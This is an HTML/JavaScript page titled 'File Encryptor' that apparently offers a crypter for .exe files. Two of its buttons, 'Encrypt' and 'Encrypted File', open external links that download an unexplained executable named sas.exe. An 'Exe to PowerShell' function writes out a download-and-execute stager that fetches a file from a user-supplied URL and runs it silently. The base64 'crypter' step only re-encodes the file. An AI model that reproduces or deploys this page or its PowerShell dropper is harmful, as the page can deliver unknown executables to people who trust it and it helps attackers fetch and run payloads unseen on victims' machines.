<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Encryptor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #6a0dad; /* Purple theme */
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            margin-bottom: 30px;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            transition: background-color 0.3s;
        }
        #choose-file-button {
            background-color: #ff69b4; /* Pink theme */
            color: white;
        }
        #choose-file-button:hover {
            background-color: #ff1493; /* Darker pink on hover */
        }
        #encrypt-button {
            background-color: #000; /* Black theme */
            color: white;
        }
        #encrypt-button:hover {
            background-color: #333; /* Darker black on hover */
        }
        #crypter-button {
            background-color: #ff4500; /* Orange theme */
            color: white;
        }
        #crypter-button:hover {
            background-color: #ff6347; /* Darker orange on hover */
        }
        #encrypted-file-button {
            background-color: #1e90ff; /* Blue theme */
            color: white;
        }
        #encrypted-file-button:hover {
            background-color: #00bfff; /* Darker blue on hover */
        }
        #copy-code-button {
            background-color: #808080; /* Grey theme */
            color: white;
        }
        #copy-code-button:hover {
            background-color: #696969; /* Darker grey on hover */
        }
        input[type="file"] {
            display: none; /* Hides the file input */
        }
        #file-name, #base64-output {
            margin-top: 20px;
            font-size: 18px;
            color: #ffeb3b; /* Yellow color for file name and output */
            cursor: pointer; /* Change cursor to indicate clickable */
        }
        #countdown {
            margin-top: 10px;
            font-size: 20px;
            color: #ffeb3b; /* Yellow color for countdown */
        }
        #base64-container, #ps-container {
            margin-top: 20px;
        }
        #base64-output, #ps-output {
            border: 1px solid white; 
            padding: 10px; 
            display: inline-block; 
            width: 400px; 
            word-wrap: break-word; 
            color: #ffeb3b; /* Yellow color for output */
        }
        #ps-input {
            width: 400px;
            padding: 10px;
            margin: 10px 0;
        }
    </style>
</head>
<body>

    <h1>File Encryptor</h1>
    <label id="choose-file-button" for="file-input">Choose File Wanna to Crypt</label>
    <input type="file" id="file-input" accept=".exe" />

    <button id="encrypt-button">Encrypt</button>
    <button id="crypter-button">Crypter</button>
    <button id="encrypted-file-button">Encrypted File</button>
    <div id="countdown"></div>

    <div id="file-name">No file chosen</div>
    
    <div id="base64-container">
        <div id="base64-output" onclick="copyToClipboard()" title="Click to copy to clipboard">
            Base64 Encoded File: Click to Generate
        </div>
        <button id="copy-code-button" onclick="copyFullCode()">Copy Full Code</button>
    </div>

    <div id="ps-container">
        <input type="text" id="ps-input" placeholder="Enter link or path for PowerShell code" />
        <button id="generate-ps-button" onclick="generatePSScript()">Exe to PowerShell</button>
        <div id="ps-output">PowerShell Code: Click to Generate</div>
    </div>

    <script>
        let selectedFile;
        let base64Output = '';

        // Display the name of the chosen file
        document.getElementById("file-input").addEventListener("change", function() {
            const fileNameDisplay = document.getElementById("file-name");
            if (this.files.length > 0) {
                selectedFile = this.files[0]; // Store the selected file
                fileNameDisplay.textContent = "Selected file: " + selectedFile.name;
                document.getElementById("base64-output").textContent = "Base64 Encoded File: Click to Generate"; // Reset output
            } else {
                fileNameDisplay.textContent = "No file chosen";
            }
        });

        // Add event listener for the encrypt button
        document.getElementById("encrypt-button").addEventListener("click", function() {
            let countdownValue = 10; // Set countdown value to 10 seconds
            const countdownDisplay = document.getElementById("countdown");
            countdownDisplay.textContent = `Executing in ${countdownValue} seconds...`;

            // Countdown interval
            const countdownInterval = setInterval(() => {
                countdownValue--;
                countdownDisplay.textContent = `Executing in ${countdownValue} seconds...`;

                // After 10 seconds, open the link and clear the interval
                if (countdownValue <= 0) {
                    clearInterval(countdownInterval);
                    window.open("https://www.upload.ee/download/17207934/3df134c596841f8ad51b/sas.exe", "_blank");
                    countdownDisplay.textContent = ""; // Clear countdown message
                }
            }, 1000); // Update every second
        });

        // Add event listener for the crypter button
        document.getElementById("crypter-button").addEventListener("click", function() {
            if (!selectedFile) {
                alert("Please choose a file first.");
                return;
            }

            let countdownValue = 10; // Set countdown value to 10 seconds
            const countdownDisplay = document.getElementById("countdown");
            countdownDisplay.textContent = `Encoding in ${countdownValue} seconds...`;

            // Countdown interval
            const countdownInterval = setInterval(() => {
                countdownValue--;
                countdownDisplay.textContent = `Encoding in ${countdownValue} seconds...`;

                // After 10 seconds, encode the file to Base64 and clear the interval
                if (countdownValue <= 0) {
                    clearInterval(countdownInterval);
                    const reader = new FileReader();

                    reader.onload = function(event) {
                        base64Output = event.target.result.split(',')[1]; // Get Base64 part
                        document.getElementById("base64-output").textContent = "Base64 Encoded File: " + base64Output; // Show Base64 encoded string
                    };

                    // Read the file as a Data URL (Base64)
                    reader.readAsDataURL(selectedFile);
                    countdownDisplay.textContent = ""; // Clear countdown message
                }
            }, 1000); // Update every second
        });

        // Function to copy Base64 string to clipboard
        function copyToClipboard() {
            navigator.clipboard.writeText(base64Output).then(() => {
                alert("Base64 encoded string copied to clipboard!");
            }).catch(err => {
                console.error('Error copying to clipboard: ', err);
            });
        }

        // Function to copy full code to clipboard
        function copyFullCode() {
            const fullCode = `
                let selectedFile; 
                // Other code here...
                // Base64 Output: ${base64Output}
            `;
            navigator.clipboard.writeText(fullCode.trim()).then(() => {
                alert("Full code copied to clipboard!");
            }).catch(err => {
                console.error('Error copying to clipboard: ', err);
            });
        }

        // Generate PowerShell script
        function generatePSScript() {
            const path = document.getElementById("ps-input").value;
            if (!path) {
                alert("Please enter a link or path.");
                return;
            }

            const psCode = `
                $client = New-Object System.Net.WebClient;
                $client.DownloadFile("${path}", "downloaded.exe");
                Start-Process "downloaded.exe" -ArgumentList '/silent' -NoNewWindow;
            `;
            document.getElementById("ps-output").textContent = "PowerShell Code: " + psCode.trim(); // Show PowerShell code
        }

        // Add event listener for the encrypted file button
        document.getElementById("encrypted-file-button").addEventListener("click", function() {
            window.open("https://www.upload.ee/download/17207934/b3663201d1ce1f8adc83/sas.exe", "_blank");
        });
    </script>

</body>
</html>
